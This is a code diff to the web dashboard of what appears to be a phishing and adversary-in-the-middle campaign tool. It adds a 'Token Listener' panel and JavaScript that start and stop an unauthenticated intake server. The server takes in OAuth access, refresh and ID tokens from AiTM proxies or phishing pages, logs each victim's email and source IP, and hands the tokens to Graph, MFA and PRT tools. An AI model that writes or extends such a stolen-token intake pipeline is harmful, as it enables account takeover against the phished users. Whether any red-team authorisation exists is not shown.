@@ -1718,6 +1718,54 @@
             </tbody>
           </table>
         </div>
+
+        <div class="section-header" style="margin-top:24px">Token Listener — OAuth token intake</div>
+        <div style="font-size:11px;color:var(--text-dim);margin-bottom:10px">
+          Standalone server that receives OAuth tokens pushed in from an AiTM proxy, a phishing page, or a manual drop and ingests them into this campaign — ingested tokens appear under <b>Tokens</b> and are usable by every Graph / MFA / PRT tool. <code>POST /token</code> accepts JSON or form-urlencoded. Tokens without a <code>campaign_id</code> land in the default campaign (this campaign while it is started here). The intake port is unauthenticated by design — bind it where only your infrastructure can reach it.
+        </div>
+        <div class="config-grid" style="grid-template-columns:1fr 1fr 1fr 1fr;gap:12px;margin-bottom:16px">
+          <div class="config-card">
+            <div class="config-card-title">Intake Port</div>
+            <div class="input-group">
+              <input type="number" id="tokenListenerPort" placeholder="8000" value="8000">
+            </div>
+            <div style="display:flex;gap:6px;margin-top:6px">
+              <button class="btn btn-primary btn-sm" onclick="startTokenListener()">Start</button>
+              <button class="btn btn-danger btn-sm" onclick="stopTokenListener()">Stop</button>
+            </div>
+          </div>
+          <div class="config-card">
+            <div class="config-card-title">Status</div>
+            <div id="tokenListenerStatus" style="font-size:11px;color:var(--text-dim);padding:8px 0">Not running</div>
+          </div>
+          <div class="config-card">
+            <div class="config-card-title">Received</div>
+            <div id="tokenListenerReceived" style="font-size:24px;font-family:var(--sans);color:var(--accent3);padding:8px 0">0</div>
+          </div>
+          <div class="config-card">
+            <div class="config-card-title">Ingested</div>
+            <div id="tokenListenerIngested" style="font-size:24px;font-family:var(--sans);color:var(--accent3);padding:8px 0">0</div>
+          </div>
+        </div>
+
+        <div class="section-header" style="display:flex;justify-content:space-between;align-items:center">
+          <span>Ingest Log (redacted)</span>
+          <button class="btn btn-sm" onclick="loadTokenListenerLogs()">↻ Refresh</button>
+        </div>
+        <div class="table-wrap">
+          <table class="data-table">
+            <thead><tr>
+              <th>Time</th>
+              <th>Source IP</th>
+              <th>Outcome</th>
+              <th>Target</th>
+              <th>Tokens</th>
+            </tr></thead>
+            <tbody id="tokenListenerLogBody">
+              <tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No tokens ingested yet</td></tr>
+            </tbody>
+          </table>
+        </div>
       </div>
 
       
@@ -2771,6 +2819,7 @@ function switchTab(name, btn) {
   if (name === 'targets')  targetsSetPage(1);
   if (name === 'sessions') { sessionsPage = 1; sessionsRenderPage(1); }
   if (name === 'qrscans') loadQRScans();
+  if (name === 'broker') { updateTokenListenerStatus(); loadTokenListenerLogs(); }
 }
 
 function switchGraphSub(name, btn) {
@@ -4174,6 +4223,87 @@ function renderGroupTabContent(tab, data) {
         <td style="color:var(--text-bright)">${escH(i.displayName||i.principalDisplayName||'—')}</td>
         <td style="color:var(--text-dim);font-size:11px">${escH(i['@odata.type']||(i.groupTypes||[]).join(',')||'—')}</td>
       </tr>`).join('') + `</tbody></table><div style="color:var(--text-dim);font-size:10px;margin-top:4px">${items.length} records</div>`;
+}
+
+// ─── TOKEN LISTENER ─────────────────────────────────────────────────────────────
+async function startTokenListener() {
+  const port = parseInt(document.getElementById('tokenListenerPort')?.value) || 8000;
+  const body = { port };
+  if (typeof activeCampaignID !== 'undefined' && activeCampaignID) body.default_campaign = activeCampaignID;
+  try {
+    const r = await fetch('/api/token-listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body) });
+    const data = await r.json();
+    if (data.error) { notify('Token listener error: ' + data.error, true); return; }
+    notify('Token listener started on port ' + (data.port || port));
+    updateTokenListenerStatus();
+  } catch(e) { notify('Token listener error: ' + e.message, true); }
+}
+
+async function stopTokenListener() {
+  try {
+    const r = await fetch('/api/token-listener/stop', { method: 'POST', headers: {'Content-Type': 'application/json'} });
+    const data = await r.json();
+    if (data.error) { notify('Token listener error: ' + data.error, true); return; }
+    notify('Token listener stopped');
+    updateTokenListenerStatus();
+  } catch(e) { notify('Token listener error: ' + e.message, true); }
+}
+
+async function updateTokenListenerStatus() {
+  try {
+    const r = await fetch('/api/token-listener/status');
+    const data = await r.json();
+    const st = document.getElementById('tokenListenerStatus');
+    if (!st) return;
+    if (data.running) {
+      st.innerHTML = `<span style="color:var(--accent3)">Running on :${data.port}</span>` +
+        (data.default_campaign ? `<br><span style="color:var(--text-dim)">default → ${escH(data.default_campaign)}</span>` : '');
+    } else {
+      st.innerHTML = '<span style="color:var(--text-dim)">Not running</span>';
+      const p = document.getElementById('tokenListenerPort');
+      if (p && data.default_port) p.value = data.default_port;
+    }
+    document.getElementById('tokenListenerReceived').textContent = data.received || 0;
+    document.getElementById('tokenListenerIngested').textContent = data.ingested || 0;
+  } catch(e) {}
+}
+
+async function loadTokenListenerLogs() {
+  let data;
+  try {
+    const r = await fetch('/api/token-listener/logs');
+    if (!r.ok) { notify('Failed to load token listener logs: ' + r.statusText, true); return; }
+    data = await r.json();
+  } catch(e) { notify('Failed to load token listener logs: ' + e.message, true); return; }
+
+  if (data.status) {
+    document.getElementById('tokenListenerReceived').textContent = data.status.received || 0;
+    document.getElementById('tokenListenerIngested').textContent = data.status.ingested || 0;
+  }
+
+  const entries = (data.entries || []).filter(e => e.type === 'token_ingest');
+  const tbody = document.getElementById('tokenListenerLogBody');
+  if (!entries.length) {
+    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:24px;color:var(--text-dim)">No tokens ingested yet</td></tr>';
+    return;
+  }
+  tbody.innerHTML = entries.slice().reverse().map(e => {
+    let p = {};
+    try { p = JSON.parse(e.body || '{}'); } catch(ex) {}
+    const ts = e.timestamp ? new Date(e.timestamp).toLocaleString() : '—';
+    const ok = (p.outcome === 'ingested');
+    const badge = ok
+      ? '<span class="badge badge-ok">ingested</span>'
+      : `<span class="badge badge-cancelled">${escH((p.outcome || '—').split(':')[0])}</span>`;
+    const toks = [p.has_access ? 'AT' : null, p.has_refresh ? 'RT' : null, p.has_id ? 'ID' : null].filter(Boolean).join(' ') || '—';
+    return `<tr>
+      <td style="font-size:11px;color:var(--text-dim)">${escH(ts)}</td>
+      <td style="font-size:11px;color:var(--accent)">${escH(e.remote_addr || '—')}</td>
+      <td>${badge}</td>
+      <td style="font-size:11px">${escH(p.target_email || '—')}</td>
+      <td style="font-size:11px;font-family:var(--mono);color:var(--accent3)">${escH(toks)}</td>
+    </tr>`;
+  }).join('');
 }
 
 // ─── BROKER TAB ─────────────────────────────────────────────────────────────────
